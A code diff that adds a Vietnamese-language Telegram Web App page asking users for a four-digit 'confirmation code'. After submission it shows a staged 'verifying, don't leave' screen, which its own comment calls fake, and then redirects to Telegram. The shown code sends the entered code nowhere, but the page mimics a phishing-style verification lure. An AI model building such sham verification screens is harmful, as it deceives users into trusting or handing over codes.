@@ -49,3 +49,141 @@ function verify() {
     `;
 }
 </script>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+body {
+    margin: 0;
+    font-family: sans-serif;
+    text-align: center;
+    background: #111;
+    color: white;
+}
+
+.container {
+    margin-top: 80px;
+}
+
+.boxes {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 20px;
+}
+
+.box {
+    width: 40px;
+    height: 50px;
+    border-radius: 8px;
+    background: #eee;
+    color: black;
+    font-size: 24px;
+    line-height: 50px;
+}
+
+button {
+    margin-top: 10px;
+    padding: 12px 25px;
+    background: #2AABEE;
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-size: 16px;
+}
+
+.keypad {
+    margin-top: 20px;
+}
+
+.keypad button {
+    width: 60px;
+    height: 50px;
+    margin: 5px;
+    font-size: 18px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h3>📩 Nhập mã xác nhận</h3>
+
+    <div class="boxes">
+        <div class="box" id="b1"></div>
+        <div class="box" id="b2"></div>
+        <div class="box" id="b3"></div>
+        <div class="box" id="b4"></div>
+    </div>
+
+    <button onclick="submitCode()">✅ XEM MÃ</button>
+
+    <div class="keypad">
+        <br>
+        <button onclick="add(1)">1</button>
+        <button onclick="add(2)">2</button>
+        <button onclick="add(3)">3</button><br>
+        <button onclick="add(4)">4</button>
+        <button onclick="add(5)">5</button>
+        <button onclick="add(6)">6</button><br>
+        <button onclick="add(7)">7</button>
+        <button onclick="add(8)">8</button>
+        <button onclick="add(9)">9</button><br>
+        <button onclick="clearAll()">⌫</button>
+        <button onclick="add(0)">0</button>
+    </div>
+</div>
+
+<script>
+Telegram.WebApp.ready();
+
+let code = "";
+
+// nhập số
+function add(n) {
+    if (code.length < 4) {
+        code += n;
+        updateUI();
+    }
+}
+
+// cập nhật ô
+function updateUI() {
+    for (let i = 1; i <= 4; i++) {
+        document.getElementById("b"+i).innerText = code[i-1] || "";
+    }
+}
+
+// xoá
+function clearAll() {
+    code = "";
+    updateUI();
+}
+
+// submit
+function submitCode() {
+
+    if (code.length < 4) {
+        Telegram.WebApp.showAlert("❗ Nhập đủ 4 số");
+        return;
+    }
+
+    // 👉 loading fake
+    document.body.innerHTML = `
+        <h2>Đợi đã, đừng đi ra ngoài</h2>
+        <p>⏳ Đang xác minh...</p>
+    `;
+
+    // 👉 chuyển link Telegram
+    setTimeout(() => {
+        Telegram.WebApp.openTelegramLink("https://t.me/telegram");
+    }, 1500);
+}
+</script>
+
+</body>
+</html>
